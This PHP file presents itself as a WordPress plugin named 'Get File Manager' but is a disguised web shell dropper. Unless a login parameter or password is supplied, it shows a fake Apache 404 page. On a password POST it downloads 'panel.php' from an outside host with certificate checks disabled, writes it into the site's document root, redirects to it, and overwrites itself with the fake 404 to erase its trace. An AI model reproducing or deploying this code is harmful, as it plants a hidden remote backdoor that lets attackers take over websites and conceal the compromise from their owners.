<?php
/*
 * Plugin Name: Get File Manager
 * Version: 1.0.1
 * Author: VinhNoName
*/
@while(ob_end_clean());
@ob_start();
if(isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) $root=$_SERVER['DOCUMENT_ROOT'];
else if(isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME'])) $root=$_SERVER['SCRIPT_FILENAME'];
else $root=realpath(dirname(__FILE__));
//list($root)=explode($_SERVER['PHP_SELF'], $root);
$posi=strrpos($root, $_SERVER['PHP_SELF']);
if($posi===false) $root=$root; else $root=substr($root, 0, $posi);
unset($posi);

if(!empty($_POST['pass'])){
$panel=$root.'/panel.php';
if(is_file($panel)) unlink($panel);
$fp=fopen($panel,'w');
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,'https://v-vinhjaxt.rhcloud.com/panel.php?tai=panel.php');
curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,array('pass'=>$_POST['pass']));
curl_setopt($ch,CURLOPT_FILE,$fp);
curl_exec($ch);
curl_close($ch);
fclose($fp);
unset($ch);
unset($fp);
$_nf='<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL /index.php was not found on this server.</p><hr><address>Apache/2.2.15 Server at '.$_SERVER['HTTP_HOST'].' Port 80</address></body></html>';
if(strpos(file_get_contents($panel),'<?php')!==false){
header('Location: /panel.php');
echo '<script>location.href="/panel.php";</script>';
file_put_contents(__FILE__,$_nf);
exit;
}}
if(!isset($_GET['login'])) exit($_nf);
?><html>
<head>
<title>Login</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">function dn(){var pass=document.getElementById("pass").value;if(pass!=""){var vdn=document.getElementById("vdn");vdn.submit();}}</script>
</head>
<body>
<div align="center">
<form method="post" id="vdn" action="">
PASSWORD<br />
<input type="password" id="pass" name="pass" size="9" onMouseout="dn();" onblur="dn();" />
<br />
<input type="submit" value="Login" />
</form>
</div>
</body>
</html>
<?php exit(); ?>
